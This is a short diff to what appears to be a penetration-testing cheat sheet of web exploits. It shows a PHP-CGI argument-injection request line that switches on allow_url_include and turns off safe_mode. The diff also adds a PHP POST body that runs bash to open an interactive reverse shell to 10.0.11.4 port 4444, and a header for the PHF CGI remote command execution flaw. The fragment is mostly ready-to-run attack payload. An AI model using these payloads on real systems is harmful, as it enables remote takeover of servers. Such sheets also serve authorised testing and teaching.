@@ -66,7 +66,7 @@ POST /?-%64+allow_url_include%3dOn+-%64+safe_mode%3d0+-d+suhosin.simulation%3d1+
 
 _POST Body Reverse TCP Shell_
 ```
-
+<?php exec("/bin/bash -c 'bash -i > /dev/tcp/10.0.11.4/4444 0>&1'");die; ?>
 ```
 
 **PHF CGI Remote Command Execution - [CVE-1999-0067]**
